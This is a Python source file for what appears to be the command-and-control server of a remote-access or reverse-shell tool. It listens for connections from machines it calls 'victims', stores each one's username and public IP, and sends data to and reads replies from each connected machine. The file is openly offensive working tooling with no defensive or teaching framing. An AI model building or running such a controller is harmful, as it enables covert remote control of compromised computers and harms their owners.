import json, select, socket

from const import Const
from victim import Victim


class Server:
    def __init__(self, ip: str, port: int):
        self.ip = ip
        self.port = port
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        self.victims: list[Victim] = []

    def send_to_victim(self, index: int, data: str) -> bool:
        try:
            sock = self.victims[index].socket
            sock.send(data.encode(encoding=Const.ENCODING))
        except:
            info = self.victims.pop(index).info
            errmsg = f'{info['username']}@{info['public_ip']}'
            raise ConnectionError(f'[-] {errmsg} disconnected')

    def get_from_victim(self, index: int) -> str | bool:
        try:
            sock = self.victims[index].socket
            return sock.recv(Const.BUFSIZE).decode(encoding=Const.ENCODING)
        except:
            info = self.victims.pop(index).info
            errmsg = f'{info['username']}@{info['public_ip']}'
            raise ConnectionError(f'[-] {errmsg} disconnected')

    def stop(self) -> None:
        self.server.close()

    def start(self) -> None:
        with self.server as server:
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind((self.ip, self.port))
            server.listen()

            print('[+] Waiting for connections...')

            inputs = [server]

            while self.server:
                readable, _, _ = select.select(inputs, [], [])

                for sock in readable:
                    if sock == server:
                        victim, addr = sock.accept()
                        inputs.append(victim)

                    else:
                        data: bytes = sock.recv(Const.BUFSIZE)

                        if not data:
                            sock.close()
                            inputs.remove(sock)
                            continue

                        try:
                            info: dict = json.loads(data.decode(encoding=Const.ENCODING))
                            self.victims.append(Victim(info=info, sock=sock))
                            print(f'[+] Got connection from: {info['public_ip']}')

                        except json.JSONDecodeError:
                            sock.close()

                        inputs.remove(sock)
